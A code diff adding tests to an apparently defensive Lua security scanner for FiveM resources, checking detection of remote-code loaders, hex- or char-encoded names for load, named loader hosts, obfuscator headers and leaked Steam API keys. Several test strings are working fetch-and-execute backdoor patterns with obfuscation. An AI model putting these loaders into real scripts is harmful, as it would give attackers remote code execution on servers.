@@ -135,3 +135,87 @@ test("LAB-SEC-112 stays precise and linear", () => {
   for (const bad of ['"' + "/.a".repeat(600_000), "--[[".repeat(500_000), ('"' + "/.a".repeat(600) + "\n").repeat(1000)]) manifest(bad);
   assert.ok(performance.now() - start < 1500);
 });
+
+test("LAB-SEC-112: the loader hosts of 2026.11.3 and the '/i?to=' loader shape on any host", () => {
+  const codes = (path, source) => securityRules(path, source).findings.map((f) => f.code);
+  for (const host of ["mazaaa.fr", "xlthki.com"]) assert.ok(codes("a.lua", `local u = "https://${host}/x"`).includes("LAB-SEC-112"), host);
+  const loader = (url) => `PerformHttpRequest(${url}, function (e, d) pcall(function() assert(load(d))() end) end)`;
+  const shape = codes("sv.lua", loader("'https://example.org/i?to=abcde'"));
+  assert.ok(shape.includes("LAB-SEC-101") && shape.includes("LAB-SEC-112"));
+  assert.ok(codes("sv.lua", loader("'https://' .. host .. '/i?to=' .. key")).includes("LAB-SEC-112"));
+  // Not the shape: the reply is only printed, or a loader on another URL (still LAB-SEC-101).
+  assert.ok(!codes("sv.lua", "PerformHttpRequest('https://example.org/i?to=abcde', function(e, d) print(d) end)").includes("LAB-SEC-112"));
+  assert.deepEqual(codes("sv.lua", loader("'https://example.org/api?id=1'")), ["LAB-SEC-101"]);
+});
+
+test("LAB-SEC-101/102: load named by a hex literal or string.char, also called directly through _G", () => {
+  const hex = '_G[("6C6F6164"):fromhex()]';
+  assert.ok(fires(`local l = ${hex}\nPerformHttpRequest(url, function(e, d) l(d)() end)`, "LAB-SEC-101"));
+  assert.ok(fires(`PerformHttpRequest(url, function(e, d) ${hex}(d)() end)`, "LAB-SEC-101"));
+  assert.ok(fires("PerformHttpRequest(url, function(e, d) _G.load(d)() end)", "LAB-SEC-101"));
+  assert.ok(fires("local l = _G[string.char(108, 111, 97, 100)]\nl(base64decode(blob))()", "LAB-SEC-102"));
+  assert.ok(fires(`${hex}(base64decode(blob))()`, "LAB-SEC-102"));
+  // "7072696E74" is "print"; a name decoded at runtime is not followed.
+  assert.ok(!fires('local p = _G[("7072696E74"):fromhex()]\nPerformHttpRequest(url, function(e, d) p(d) end)', "LAB-SEC-101"));
+  assert.ok(!fires("local l = _G[name:fromhex()]\nPerformHttpRequest(url, function(e, d) l(d)() end)", "LAB-SEC-101"));
+});
+
+test("LAB-SEC-108: a Steam Web API key in a URL or assigned to a steam key name, not a placeholder", () => {
+  const key = "0123456789ABCDEF0123456789ABCDEF";
+  const codes = (path, source) => securityRules(path, source).findings.map((f) => f.code);
+  const [f] = findings(`local u = "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/?key=${key}&steamids=" .. id`, "LAB-SEC-108");
+  assert.ok(f.message.includes("Steam Web API key") && !f.message.includes(key));
+  assert.ok(fires(`Config.SteamApiKey = "${key.toLowerCase()}"`, "LAB-SEC-108"));
+  assert.ok(codes("server.cfg", `set steam_webApiKey "${key}"`).includes("LAB-SEC-108"));
+  for (const clean of ['Config.SteamApiKey = "YOUR_STEAM_KEY"', 'set steam_webApiKey "none"', 'local u = ("https://api.steampowered.com/x/?key=%s"):format(key)', `local hash = "${key}"`])
+    assert.ok(!codes("a.lua", clean).includes("LAB-SEC-108"), clean);
+});
+
+test("LAB-SEC-115: the name of load written in encoded form, an error", () => {
+  const codes = (source) => securityRules("src/utils.lua", source).findings.map((f) => f.code);
+  const hex = 'string.fromhex = function(s) return (s:gsub("..", function(c) return string.char(tonumber(c, 16)) end)) end\n';
+  const loader = `${hex}lib = function() return { localize = _G[("6C6F6164"):fromhex()] } end\nRet = function(e, d) local s = lib()["localize"](d:fromhex()) if s then s() end end`;
+  assert.ok(codes(loader).includes("LAB-SEC-115"));
+  assert.ok(!codes(loader).includes("LAB-SEC-110"));
+  const [f] = securityRules("src/utils.lua", loader).findings.filter((x) => x.code === "LAB-SEC-115");
+  assert.deepEqual([f.severity, f.line], ["error", 2]);
+  for (const src of [
+    'local k = "6c6f6164737472696e67"',
+    'local k = "bG9hZA=="',
+    'local f = _G["\\108\\111\\97\\100"]',
+    'local f = _G["\\x6c\\x6f\\x61\\x64\\x73\\x74\\x72\\x69\\x6e\\x67"]',
+    "local f = _G[string.char(108, 111, 97, 100)]",
+    'local f = _G["lo" .. "ad"]',
+    'local f = getfenv()[("l" .. "oad")]',
+  ])
+    assert.ok(codes(src).includes("LAB-SEC-115"), src);
+  for (const src of [
+    "local f = load(LoadResourceFile(GetCurrentResourceName(), 'data.lua'))",
+    'local f = _G["load"]',
+    'local s = ("48656C6C6F"):fromhex()',
+    "local s = string.char(72, 105)",
+    'local s = "pay" .. "load"',
+    'local s = "6c6f616465"',
+    'TriggerEvent("loading:done")',
+  ])
+    assert.ok(!codes(src).includes("LAB-SEC-115"), src);
+});
+
+test("LAB-SEC-115 stays linear on a long concatenation chain", () => {
+  const chain = `local s = ${Array.from({ length: 50_000 }, (_, i) => `"p${i}"`).join(" .. ")}`;
+  const start = performance.now();
+  assert.ok(!securityRules("src/utils.lua", chain).findings.some((f) => f.code === "LAB-SEC-115"));
+  assert.ok(performance.now() - start < 3_000);
+});
+
+test("LAB-SEC-103 names Boronide, whose header is only a comment", () => {
+  assert.ok(securityRules("a.lua", "--Boronide™ Premium Obfuscation, v0.5.0\n\nlocal a = 1").findings.some((f) => f.code === "LAB-SEC-103"));
+});
+
+test("CfxLua table unpacking (`local a, b in data`) parses, so the Lua checks run", () => {
+  const r = securityRules("a.lua", "local title, duration in data\nPerformHttpRequest(url, function(e, d) load(d)() end)");
+  assert.equal(r.parsed, true);
+  assert.ok(r.findings.some((f) => f.code === "LAB-SEC-101" && f.line === 2));
+  assert.equal(securityRules("a.lua", "local a, b in data\nprint(a, b)").parsed, true);
+  assert.equal(securityRules("a.lua", 'local s = "local a in x"').parsed, true);
+});
